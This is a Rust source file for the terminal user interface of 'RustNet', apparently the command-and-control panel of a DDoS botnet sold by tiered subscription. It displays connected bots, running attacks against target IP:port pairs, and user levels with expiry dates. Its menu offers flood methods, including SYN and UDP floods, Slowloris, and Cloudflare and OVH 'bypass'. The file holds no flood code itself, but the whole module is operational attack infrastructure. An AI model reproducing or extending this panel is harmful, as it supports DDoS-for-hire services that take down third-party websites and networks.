use std::sync::Arc;
use std::time::Duration;
use crate::modules::client_manager::Client;
use crate::modules::state::AppState;
use crate::modules::error::Result;
use crate::modules::auth::Level;
use super::ui::*;

pub async fn render_status_bar(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    let bot_count = state.bot_manager.get_bot_count().await;
    let client_count = state.client_manager.get_client_count().await;
    let attack_count = state.attack_manager.get_active_count().await;
    let max_attacks = state.config.read().await.max_attacks;
    
    let uptime = state.started_at.elapsed();
    let days = uptime.as_secs() / 86400;
    let hours = (uptime.as_secs() % 86400) / 3600;
    let minutes = (uptime.as_secs() % 3600) / 60;
    
    let breadcrumb = client.get_breadcrumb().await;
    let width = get_terminal_width(state).await;
    
    // Position cursor at row 31 to reserve row 32 for the prompt
    client.write(b"\x1b[31;1H").await?;
    
    // Combined line: Breadcrumb on left, Status on right (120 char width)
    let uptime_str = if days > 0 {
        format!("{}d {}h", days, hours)
    } else if hours > 0 {
        format!("{}h {}m", hours, minutes)
    } else {
        format!("{}m", minutes)
    };
    
    // Using water colors: 39 (Blue), 51 (Cyan)
    let status_right = format!(
        "\x1b[38;5;39m[B:\x1b[38;5;51m{}\x1b[38;5;39m][U:\x1b[38;5;51m{}\x1b[38;5;39m][A:\x1b[38;5;51m{}/{}\x1b[38;5;39m][Up:\x1b[38;5;51m{}\x1b[38;5;39m]\x1b[0m",
        bot_count, client_count, attack_count, max_attacks, uptime_str
    );
    
    // Calculate padding to push status to the right
    let breadcrumb_display = format!("\x1b[38;5;51m→ {}\x1b[0m", breadcrumb);
    let breadcrumb_len = breadcrumb.len() + 2; // arrow + space + text
    let status_len = format!("[B:{}][U:{}][A:{}/{}][Up:{}]", bot_count, client_count, attack_count, max_attacks, uptime_str).len();
    let padding = if breadcrumb_len + status_len + 1 < width {
        width - breadcrumb_len - status_len
    } else {
        1
    };
    
    client.write(format!(
        "{}{:width$}{}\x1b[K\r",
        breadcrumb_display,
        "",
        status_right,
        width = padding
    ).as_bytes()).await?;
    
    Ok(())
}

pub async fn show_prompt(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    render_status_bar(client, state).await?;
    client.write(b"\x1b[32;1H").await?; // Move to last row for prompt
    client.write(b"\x1b[K").await?;    // Clear existing content on the row
    // Changed prompt color to 51 (Cyan) to match water theme
    client.write(b"[\x1b[38;5;51mRustNet\x1b[0m]> ").await?;
    Ok(())
}

pub async fn handle_help_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    
    let title = apply_ice_gradient("Help Menu");
    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
    client.write(b"  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r").await?;
    
    let commands = [
        ("help", "Show this help menu"),
        ("methods", "Show attack methods"),
        ("stats", "Show server statistics"),
        ("online", "Show online users"),
        ("whoami", "Show your information"),
        ("rules", "Show server rules"),
        ("version", "Show server version"),
        ("dashboard", "Show main dashboard"),
        ("uptime", "Show server uptime"),
        ("gif", "List or play GIFs"),
        ("clear", "Clear the screen"),
        ("exit", "Disconnect from server")
    ];
    
    for (cmd, desc) in commands.iter() {
        let cmd_gradient = apply_gradient(cmd, 39, 51);
        client.write(format!("  \x1b[38;5;245m{:<12} : \x1b[0m{}\n\r", cmd_gradient, desc).as_bytes()).await?;
    }
    
    let user_level = client.user.get_level();
    if user_level >= Level::Admin {
        client.write(b"\n\r").await?;
        let admin_title = apply_ice_gradient("Admin Commands");
        client.write(format!("  {}\n\r", admin_title).as_bytes()).await?;
        client.write(b"  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r").await?;
        
        let admin_cmds = [
            ("users", "Manage users"),
            ("bots", "Manage bots"),
            ("broadcast", "Send message to all users"),
            ("kick", "Kick a user")
        ];
        
        for (cmd, desc) in admin_cmds.iter() {
            let cmd_gradient = apply_gradient(cmd, 196, 202);
            client.write(format!("  \x1b[38;5;245m{:<12} : \x1b[0m{}\n\r", cmd_gradient, desc).as_bytes()).await?;
        }
    }
    
    client.write(b"\n\r").await?;
    
    client.set_breadcrumb("Home > Help").await;
    show_prompt(client, state).await?;

    Ok(())
}

pub async fn handle_stats_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    let bot_count = state.bot_manager.get_bot_count().await;
    let client_count = state.client_manager.get_client_count().await;
    let attack_count = state.attack_manager.get_active_count().await;
    
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    
    let title = apply_ice_gradient("Server Statistics");
    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
    client.write(b"  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r").await?;
    
    let bot_gradient = apply_gradient(&bot_count.to_string(), 39, 51);
    client.write(format!("  \x1b[38;5;245mBots Connected  : \x1b[0m{}\n\r", bot_gradient).as_bytes()).await?;
    
    let client_gradient = apply_gradient(&client_count.to_string(), 39, 51);
    client.write(format!("  \x1b[38;5;245mUsers Connected : \x1b[0m{}\n\r", client_gradient).as_bytes()).await?;
    
    let attack_gradient = apply_gradient(&format!("{}/{}", attack_count, state.config.read().await.max_attacks), 39, 51);
    client.write(format!("  \x1b[38;5;245mActive Attacks  : \x1b[0m{}\n\r", attack_gradient).as_bytes()).await?;
    
    client.write(b"\n\r").await?;
    
    client.set_breadcrumb("Home > Server Stats").await;
    Ok(())
}

pub async fn handle_health_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    let bot_count = state.bot_manager.get_bot_count().await;
    let client_count = state.client_manager.get_client_count().await;
    let attack_count = state.attack_manager.get_active_count().await;
    
    let uptime = state.started_at.elapsed();
    let days = uptime.as_secs() / 86400;
    let hours = (uptime.as_secs() % 86400) / 3600;
    let minutes = (uptime.as_secs() % 3600) / 60;
    
    let status = if bot_count > 0 && client_count > 0 { "HEALTHY" } else { "DEGRADED" };
    let status_color = if status == "HEALTHY" { 51 } else { 39 };
    
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    
    let title = apply_ice_gradient("System Health Check");
    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
    client.write(b"  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r").await?;
    
    let status_gradient = apply_gradient(status, status_color, status_color + 6);
    client.write(format!("  \x1b[38;5;245mSystem Status   : \x1b[0m{}\n\r", status_gradient).as_bytes()).await?;
    
    let uptime_str = format!("{}d {}h {}m", days, hours, minutes);
    let uptime_gradient = apply_gradient(&uptime_str, 39, 51);
    client.write(format!("  \x1b[38;5;245mSystem Uptime   : \x1b[0m{}\n\r", uptime_gradient).as_bytes()).await?;
    
    let bots_gradient = apply_gradient(&bot_count.to_string(), 39, 51);
    client.write(format!("  \x1b[38;5;245mBots Online     : \x1b[0m{}\n\r", bots_gradient).as_bytes()).await?;
    
    let clients_gradient = apply_gradient(&client_count.to_string(), 39, 51);
    client.write(format!("  \x1b[38;5;245mClients Online  : \x1b[0m{}\n\r", clients_gradient).as_bytes()).await?;
    
    let attacks_gradient = apply_gradient(&attack_count.to_string(), 39, 51);
    client.write(format!("  \x1b[38;5;245mActive Attacks  : \x1b[0m{}\n\r", attacks_gradient).as_bytes()).await?;
    
    client.write(b"\n\r").await?;
    
    client.set_breadcrumb("Home > Health Check").await;
    Ok(())
}

pub async fn handle_online_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    let clients = state.client_manager.get_all_clients().await;
    
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    
    let title = apply_ice_gradient("Online Users");
    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
    client.write(b"  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r").await?;
    
    if clients.is_empty() {
        client.write(b"  \x1b[38;5;245mNo users online\x1b[0m\n\r").await?;
    } else {
        for c in clients.iter() {
            let level_color = match c.user.get_level() {
                Level::Owner => 39,
                Level::Admin => 45,
                Level::Pro => 87,
                Level::Basic => 195,
            };
            let indicator = if c.id == client.id { "●" } else { "○" };
            
            let username_gradient = apply_gradient(&c.user.username, level_color, level_color + 6);
            let addr_display = &c.address[..c.address.len().min(22)];
            let addr_gradient = apply_gradient(addr_display, 39, 45);
            
            client.write(format!("  \x1b[38;5;240m{} \x1b[0m{} \x1b[38;5;240m[\x1b[0m{}\x1b[38;5;240m]\x1b[0m\n\r", 
                indicator, username_gradient, addr_gradient).as_bytes()).await?;
        }
    }
    
    client.write(b"  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r").await?;
    client.write(format!("  \x1b[38;5;245mTotal Users: \x1b[38;5;39m{}\x1b[0m\n\r", clients.len()).as_bytes()).await?;
    client.write(b"\n\r").await?;
    
    client.set_breadcrumb("Home > Online Users").await;
    Ok(())
}

pub async fn handle_whoami_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    
    let title = apply_ice_gradient("Your Information");
    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
    client.write(b"  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r").await?;
    
    let level_color = match client.user.get_level() {
        Level::Owner => 39,
        Level::Admin => 45,
        Level::Pro => 87,
        Level::Basic => 195,
    };
    
    let username_gradient = apply_gradient(&client.user.username, 33, 51);
    let level_gradient = apply_gradient(client.user.get_level().to_str(), level_color, level_color + 6);
    let expire_str = client.user.expire.format("%Y-%m-%d %H:%M").to_string();
    
    client.write(format!("  \x1b[38;5;245mUsername : \x1b[0m{}\n\r", username_gradient).as_bytes()).await?;
    client.write(format!("  \x1b[38;5;245mLevel    : \x1b[0m{}\n\r", level_gradient).as_bytes()).await?;
    client.write(format!("  \x1b[38;5;245mAddress  : \x1b[38;5;39m{}\x1b[0m\n\r", client.address).as_bytes()).await?;
    client.write(format!("  \x1b[38;5;245mExpires  : \x1b[38;5;39m{}\x1b[0m\n\r", expire_str).as_bytes()).await?;
    
    client.write(b"\n\r").await?;
    
    client.set_breadcrumb("Home > User Info").await;
    Ok(())
}

pub async fn handle_uptime_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    let uptime = state.started_at.elapsed();
    let days = uptime.as_secs() / 86400;
    let hours = (uptime.as_secs() % 86400) / 3600;
    let minutes = (uptime.as_secs() % 3600) / 60;
    let seconds = uptime.as_secs() % 60;
    
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    
    let title = apply_ice_gradient("Server Uptime");
    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
    client.write(b"  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r").await?;
    
    let days_str = apply_gradient(&format!("{}d", days), 39, 45);
    let hours_str = apply_gradient(&format!("{}h", hours), 45, 51);
    let minutes_str = apply_gradient(&format!("{}m", minutes), 51, 87);
    let seconds_str = apply_gradient(&format!("{}s", seconds), 87, 195);
    
    client.write(format!("  \x1b[38;5;245mUptime : \x1b[0m{} {} {} {}\n\r", 
        days_str, hours_str, minutes_str, seconds_str).as_bytes()).await?;
    
    client.write(b"\n\r").await?;
    
    client.set_breadcrumb("Home > Server Uptime").await;
    Ok(())
}

pub async fn handle_gif_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
    use tokio::io::AsyncBufReadExt;
    use std::path::Path;

    let gifs_dir = Path::new("data/gifs");
    if !gifs_dir.exists() {
        client.write(b"\x1b[38;5;196m[X] GIFs directory not found (data/gifs)\n\r").await?;
        return Ok(());
    }

    // If no argument: list available .tfx files
    if parts.len() < 2 {
        let mut entries = tokio::fs::read_dir(gifs_dir).await?;
        let mut files: Vec<String> = Vec::new();
        while let Some(entry) = entries.next_entry().await? {
            let fi = entry.file_name().to_string_lossy().to_string();
            if fi.ends_with(".tfx") {
                files.push(fi);
            }
        }

        if files.is_empty() {
            client.write(b"\x1b[38;5;245mNo GIF files found\x1b[0m\n\r").await?;
            return Ok(());
        }

        client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
        
        let title = apply_ice_gradient("Available GIFs");
        client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
        client.write(b"  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r").await?;
        
        for (i, f) in files.iter().enumerate() {
            let index_gradient = apply_gradient(&format!("{}.", i + 1), 245, 250);
            let file_gradient = apply_gradient(f, 39, 51);
            client.write(format!("  {} {}\n\r", index_gradient, file_gradient).as_bytes()).await?;
        }
        
        client.write(b"\n\r").await?;
        
        return Ok(());
    }

    // Play specified file - accept with or without .tfx extension
    let mut filename = parts[1].to_string();
    if !filename.ends_with(".tfx") {
        filename.push_str(".tfx");
    }
    
    let base = Path::new(&filename)
        .file_name()
        .and_then(|s| s.to_str())
        .unwrap_or(&filename);

    let path = gifs_dir.join(base);
    if tokio::fs::metadata(&path).await.is_err() {
        client.write(b"\x1b[38;5;196m[X] GIF file not found\n\r").await?;
        return Ok(());
    }

    let file = tokio::fs::File::open(&path).await?;
    let reader = tokio::io::BufReader::new(file);
    let mut lines = reader.lines();

    // Clear screen, clear scrollback, move home, hide cursor
    client.write(b"\x1b[2J\x1b[3J\x1b[H\x1b[?25l").await?;

    let mut buffer: Vec<u8> = Vec::with_capacity(4096);
    while let Some(line) = lines.next_line().await? {
        let l = line.trim_end_matches(&['\r', '\n'][..]).to_string();
        if l.contains("\x1b[") {
            buffer.extend_from_slice(l.as_bytes());
            buffer.extend_from_slice(b"\r\n");
            if buffer.len() > 2048 {
                client.write(buffer.as_slice()).await?;
                buffer.clear();
            }
        } else {
            if !buffer.is_empty() {
                client.write(buffer.as_slice()).await?;
                buffer.clear();
            }
            client.write(format!("{}\r\n", l).as_bytes()).await?;
        }
        tokio::time::sleep(Duration::from_millis(2)).await;
    }

    if !buffer.is_empty() {
        client.write(buffer.as_slice()).await?;
    }

    // Show cursor, clear screen and buffer after playback finishes
    client.write(b"\x1b[?25h").await?;
    tokio::time::sleep(Duration::from_millis(500)).await;
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;

    Ok(())
}

pub async fn handle_methods_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    
    let title = apply_ice_gradient("Attack Methods");
    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
    client.write(b"  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r").await?;
    
    let l4_methods = [
        ("UDP", "UDP Flood"),
        ("TCP", "TCP Flood"),
        ("SYN", "SYN Flood"),
        ("ACK", "ACK Flood"),
        ("VSE", "Valve Source Engine"),
        ("OVH", "OVH Bypass")
    ];
    
    let l7_methods = [
        ("HTTP", "HTTP Flood"),
        ("CF-BYPASS", "Cloudflare Bypass"),
        ("SLOWLORIS", "Slowloris Attack"),
        ("STRESS", "HTTP Stress Test")
    ];
    
    client.write(b"  \x1b[38;5;39mLayer 4 Methods\x1b[0m\n\r").await?;
    for (name, desc) in l4_methods.iter() {
        let name_gradient = apply_gradient(name, 39, 51);
        client.write(format!("  \x1b[38;5;245m{:<12} : \x1b[0m{}\n\r", name_gradient, desc).as_bytes()).await?;
    }
    
    client.write(b"\n\r  \x1b[38;5;51mLayer 7 Methods\x1b[0m\n\r").await?;
    for (name, desc) in l7_methods.iter() {
        let name_gradient = apply_gradient(name, 51, 87);
        client.write(format!("  \x1b[38;5;245m{:<12} : \x1b[0m{}\n\r", name_gradient, desc).as_bytes()).await?;
    }
    
    client.write(b"\n\r").await?;
    
    client.set_breadcrumb("Home > Attack Methods").await;
    show_prompt(client, state).await?;
    Ok(())
}

pub async fn handle_dashboard_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    let bot_count = state.bot_manager.get_bot_count().await;
    let client_count = state.client_manager.get_client_count().await;
    let attack_count = state.attack_manager.get_active_count().await;
    let attacks = state.attack_manager.get_all_attacks().await;
    let user_attacks = state.attack_manager.get_user_attacks(&client.user.username).await;
    
    let uptime = state.started_at.elapsed();
    let days = uptime.as_secs() / 86400;
    let hours = (uptime.as_secs() % 86400) / 3600;
    let minutes = (uptime.as_secs() % 3600) / 60;
    
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    
    let title = apply_ice_gradient("RustNet Dashboard");
    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
    client.write(b"  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r").await?;
    
    // System Status
    let status = if bot_count > 0 && client_count > 0 { 
        apply_gradient("HEALTHY", 51, 87)
    } else {
        apply_gradient("DEGRADED", 39, 45)
    };
    
    client.write(format!("  \x1b[38;5;245mSystem Status   : \x1b[0m{}\n\r", status).as_bytes()).await?;
    
    let uptime_str = format!("{}d {}h {}m", days, hours, minutes);
    let uptime_gradient = apply_gradient(&uptime_str, 39, 51);
    client.write(format!("  \x1b[38;5;245mSystem Uptime   : \x1b[0m{}\n\r", uptime_gradient).as_bytes()).await?;
    
    let bots_gradient = apply_gradient(&format!("{}/{}", bot_count, state.config.read().await.max_bot_connections), 39, 51);
    client.write(format!("  \x1b[38;5;245mConnected Bots  : \x1b[0m{}\n\r", bots_gradient).as_bytes()).await?;
    
    let users_gradient = apply_gradient(&format!("{}/{}", client_count, state.config.read().await.max_user_connections), 39, 51);
    client.write(format!("  \x1b[38;5;245mConnected Users : \x1b[0m{}\n\r", users_gradient).as_bytes()).await?;
    
    let attacks_gradient = apply_gradient(&format!("{}/{}", attack_count, state.config.read().await.max_attacks), 39, 51);
    client.write(format!("  \x1b[38;5;245mActive Attacks  : \x1b[0m{}\n\r", attacks_gradient).as_bytes()).await?;
    
    client.write(b"\n\r").await?;
    
    // Active Attacks List
    let active_title = apply_ice_gradient("Active Attacks");
    client.write(format!("  {}\n\r", active_title).as_bytes()).await?;
    client.write(b"  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r").await?;
    
    if attacks.is_empty() {
        client.write(b"  \x1b[38;5;245mNo active attacks running\x1b[0m\n\r").await?;
    } else {
        for attack in attacks.iter().take(5) {
            let remaining = attack.remaining_duration().as_secs();
            let method_color = match attack.method.as_str() {
                m if m.contains("slow") => 39,
                m if m.contains("ssl") => 45,
                m if m.contains("http") || m.contains("websocket") => 51,
                m if m.contains("udp") => 87,
                _ => 195
            };
            
            let method_gradient = apply_gradient(&attack.method.trim_start_matches('!'), method_color, method_color + 6);
            let target_gradient = apply_gradient(&format!("{}:{}", attack.ip, attack.port), 245, 250);
            let time_gradient = apply_gradient(&format!("{}s", remaining), 51, 57);
            
            client.write(format!("  \x1b[38;5;240m[\x1b[0m{}\x1b[38;5;240m] \x1b[0m{} \x1b[38;5;240m-> \x1b[0m{}\n\r", 
                time_gradient, method_gradient, target_gradient).as_bytes()).await?;
        }
        
        if attacks.len() > 5 {
            client.write(format!("  \x1b[38;5;245m... and {} more attacks\x1b[0m\n\r", attacks.len() - 5).as_bytes()).await?;
        }
    }
    
    client.write(b"\n\r").await?;
    
    // User Activity
    let user_title = apply_ice_gradient("Your Activity");
    client.write(format!("  {}\n\r", user_title).as_bytes()).await?;
    client.write(b"  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r").await?;
    
    let user_attacks_gradient = apply_gradient(&user_attacks.len().to_string(), 39, 51);
    client.write(format!("  \x1b[38;5;245mYour Active Attacks : \x1b[0m{}\n\r", user_attacks_gradient).as_bytes()).await?;
    
    client.write(b"\n\r").await?;
    
    Ok(())
}

pub async fn handle_version_command(client: &Arc<Client>, _state: &Arc<AppState>) -> Result<()> {
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    
    let title = apply_ice_gradient("Server Version");
    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
    client.write(b"  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r").await?;
    
    let version = apply_gradient(env!("CARGO_PKG_VERSION"), 39, 51);
    let author = apply_gradient("RustNet Team", 51, 87);
    
    client.write(format!("  \x1b[38;5;245mVersion : \x1b[0m{}\n\r", version).as_bytes()).await?;
    client.write(format!("  \x1b[38;5;245mAuthor  : \x1b[0m{}\n\r", author).as_bytes()).await?;
    client.write(b"  \x1b[38;5;245mLicense : \x1b[0mMIT\n\r").await?;
    
    client.write(b"\n\r").await?;
    
    client.set_breadcrumb("Home > Version").await;
    Ok(())
}

pub async fn handle_rules_command(client: &Arc<Client>, _state: &Arc<AppState>) -> Result<()> {
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    
    let title = apply_ice_gradient("Server Rules");
    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
    client.write(b"  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r").await?;
    
    let rules = [
        "Do not attack government websites",
        "Do not attack educational institutions",
        "Do not attack hospitals or medical facilities",
        "Respect other users",
        "No spamming in chat"
    ];
    
    for (i, rule) in rules.iter().enumerate() {
        let index_gradient = apply_gradient(&format!("{}.", i + 1), 245, 250);
        let rule_gradient = apply_gradient(rule, 39, 51);
        client.write(format!("  {} {}\n\r", index_gradient, rule_gradient).as_bytes()).await?;
    }
    
    client.write(b"\n\r").await?;
    
    client.set_breadcrumb("Home > Rules").await;
    Ok(())
}
